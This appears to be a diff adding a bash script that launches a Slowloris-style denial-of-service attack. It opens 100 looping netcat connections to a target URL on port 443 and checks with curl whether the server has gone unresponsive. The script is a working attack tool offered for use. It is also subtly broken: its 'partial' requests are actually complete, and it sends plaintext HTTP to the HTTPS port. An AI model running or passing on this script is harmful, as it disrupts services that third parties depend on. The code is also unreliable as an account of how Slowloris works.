@@ -1,0 +1,62 @@
+#!/bin/bash
+
+# Check if the target URL is provided
+if [ -z "$1" ]; then
+    echo "Usage: $0 <target_url>"
+    exit 1
+fi
+
+# Define the target URL and port (443 for HTTPS)
+TARGET=$1
+PORT=443
+
+# Number of threads/connections to open
+CONNECTIONS=100
+
+# Check if target is responsive before starting attack
+echo "Checking if $TARGET is responsive..."
+ping -c 1 $TARGET &> /dev/null
+
+if [ $? -ne 0 ]; then
+    echo "Error: Unable to reach $TARGET. Exiting..."
+    exit 1
+fi
+
+echo "$TARGET is reachable. Proceeding with Slowloris attack."
+
+# Function to send incomplete HTTP requests
+send_request() {
+    while true; do
+        # Using netcat (nc) to send partial HTTP GET request
+        (echo -ne "GET / HTTP/1.1\r\nHost: $TARGET\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\n\r\n") | nc -v -w 1 $TARGET $PORT > /dev/null 2>&1 &
+        # Sleep to manage rate of connections
+        sleep 0.1
+    done
+}
+
+# Loop to open multiple connections (threads)
+echo "Starting Slowloris attack on $TARGET:$PORT..."
+for ((i=1; i<=CONNECTIONS; i++))
+do
+    send_request &
+    echo "Connection $i opened."
+done
+
+# Check if the server is responsive after opening connections
+echo "Checking server responsiveness after initiating the attack..."
+
+sleep 5  # Wait for some time to allow the attack to run
+
+# Try accessing the website after attack has started
+curl --head --silent $TARGET > /dev/null
+
+if [ $? -ne 0 ]; then
+    echo "The target $TARGET is likely vulnerable to Slowloris. The server is unresponsive or slow."
+    echo "Slowloris attack has likely succeeded in causing a denial of service."
+else
+    echo "The target $TARGET is still responsive. Slowloris attack might not have been successful."
+fi
+
+# Wait for all background processes to finish
+wait
+echo "Slowloris attack completed."
